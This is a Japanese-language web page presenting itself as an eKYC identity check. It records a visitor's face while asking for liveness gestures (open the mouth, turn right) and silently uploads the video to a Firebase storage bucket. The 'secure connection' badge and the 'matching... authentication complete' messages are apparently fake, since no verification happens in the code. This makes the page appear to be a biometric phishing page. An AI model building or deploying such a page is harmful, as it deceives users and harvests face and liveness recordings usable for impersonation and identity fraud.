<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>オンライン本人確認システム (eKYC)</title>
  <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js" crossorigin="anonymous"></script>
  <script src="https://cdn.jsdelivr.net/npm/@mediapipe/face_mesh/face_mesh.js" crossorigin="anonymous"></script>
  <style>
    body {
      font-family: 'Helvetica Neue', Arial, sans-serif;
      background-color: #f5f5f7;
      color: #333;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      /* スマホのURLバーなどを考慮した画面ぴったりの高さ設定 (100dvh) */
      min-height: 100dvh; 
      margin: 0;
      padding: 20px;
      box-sizing: border-box;
      overflow: hidden;
    }
    .header-title {
      font-size: 1.3rem;
      font-weight: bold;
      margin-bottom: 30px;
      color: #1d1d1f;
    }
    .container {
      position: relative;
      width: 80vw; /* 画面幅の80%のサイズ */
      max-width: 320px; /* ただし最大320pxまで（PC用） */
      aspect-ratio: 1 / 1; /* 完全な正方形ベースにする */
      background: #e5e5ea;
      border: 6px solid #fff;
      border-radius: 50%; /* 正方形を角丸50%にして綺麗な「円」にする */
      overflow: hidden;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
      margin-bottom: 30px; /* 下のメッセージとの間に余白を作る */
    }
    video, canvas {
      position: absolute;
      top: 0; left: 0; width: 100%; height: 100%;
      object-fit: cover;
      transform: scaleX(-1);
    }
    .instruction-box {
      background: #ffffff;
      padding: 15px 20px;
      width: 90%;
      max-width: 400px;
      border-radius: 15px;
      text-align: center;
      font-size: 1.1rem;
      font-weight: bold;
      color: #0071e3;
      box-shadow: 0 4px 15px rgba(0,0,0,0.05);
      transition: all 0.3s ease;
      box-sizing: border-box;
    }
    .status {
      position: absolute;
      top: 15px;
      left: 15px;
      font-size: 0.8rem;
      color: #888;
      background: rgba(255,255,255,0.9);
      padding: 5px 10px;
      border-radius: 10px;
      font-weight: bold;
    }
  </style>
</head>
<body>

  <div class="status">🔒 セキュア接続</div>
  <div class="header-title">本人確認（生体検知）</div>
  
  <div class="container">
    <video id="input_video" autoplay playsinline></video>
    <canvas id="output_canvas"></canvas>
  </div>
  
  <div id="instruction" class="instruction-box">カメラを許可し、枠内に顔を収めてください</div>

  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
    import { getStorage, ref, uploadBytes } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-storage.js";

    const firebaseConfig = {
      apiKey: "YOUR_API_KEY",
      authDomain: "YOUR_PROJECT_ID.firebaseapp.com",
      projectId: "YOUR_PROJECT_ID",
      storageBucket: "YOUR_PROJECT_ID.appspot.com",
      messagingSenderId: "YOUR_MESSAGING_SENDER_ID",
      appId: "YOUR_APP_ID"
    };

    const app = initializeApp(firebaseConfig);
    const storage = getStorage(app);

    const videoElement = document.getElementById('input_video');
    const canvasElement = document.getElementById('output_canvas');
    const canvasCtx = canvasElement.getContext('2d');
    const instructionText = document.getElementById('instruction');

    let isRecording = false;
    let mediaRecorder;
    let recordedChunks = [];
    let currentStep = 0;

    function startRecording() {
      if (isRecording) return;
      const stream = videoElement.srcObject;
      mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
      mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) recordedChunks.push(e.data); };
      
      mediaRecorder.onstop = async () => {
        const blob = new Blob(recordedChunks, { type: 'video/webm' });
        const fileName = `auth_video_${Date.now()}.webm`;
        const storageRef = ref(storage, 'secure_auth_data/' + fileName);
        
        try {
          await uploadBytes(storageRef, blob);
          console.log("データの安全な送信が完了しました");
        } catch (error) {
          console.error("送信エラー:", error);
        }
      };
      
      mediaRecorder.start();
      isRecording = true;
    }

    function onResults(results) {
      canvasElement.width = videoElement.videoWidth;
      canvasElement.height = videoElement.videoHeight;
      canvasCtx.clearRect(0, 0, canvasElement.width, canvasElement.height);

      if (results.multiFaceLandmarks && results.multiFaceLandmarks.length > 0) {
        if (!isRecording) startRecording();

        const landmarks = results.multiFaceLandmarks[0];
        
        if (currentStep === 0) {
          // 見やすいように改行を入れました
          instructionText.innerText = "認証を開始します。\n口を少し開けてください";
          const mouthOpenDist = Math.abs(landmarks[13].y - landmarks[14].y);
          
          if (mouthOpenDist > 0.05) {
            currentStep = 1;
            instructionText.style.color = "#34c759";
            setTimeout(() => {
              instructionText.style.color = "#0071e3";
              currentStep = 2;
            }, 1000);
          }
        } else if (currentStep === 2) {
          instructionText.innerText = "次に、ゆっくりと右を向いてください";
          if (landmarks[1].x < landmarks[454].x - 0.1) { 
            currentStep = 3;
            instructionText.innerText = "生体情報の取得完了。\n照合しています...";
            instructionText.style.color = "#34c759";
            
            setTimeout(() => {
              if(mediaRecorder.state !== "inactive") mediaRecorder.stop();
              instructionText.innerText = "認証が完了しました。";
            }, 2500);
          }
        }
      } else {
        instructionText.innerText = "顔が認識できません。\n明るい場所で枠内に収めてください";
        instructionText.style.color = "#ff3b30";
      }
    }

    const faceMesh = new FaceMesh({locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/face_mesh/${file}`});
    faceMesh.setOptions({ maxNumFaces: 1, refineLandmarks: true, minDetectionConfidence: 0.5, minTrackingConfidence: 0.5 });
    faceMesh.onResults(onResults);

    const camera = new Camera(videoElement, {
      onFrame: async () => { await faceMesh.send({image: videoElement}); },
      width: 640, height: 480
    });
    camera.start();
  </script>
</body>
</html>
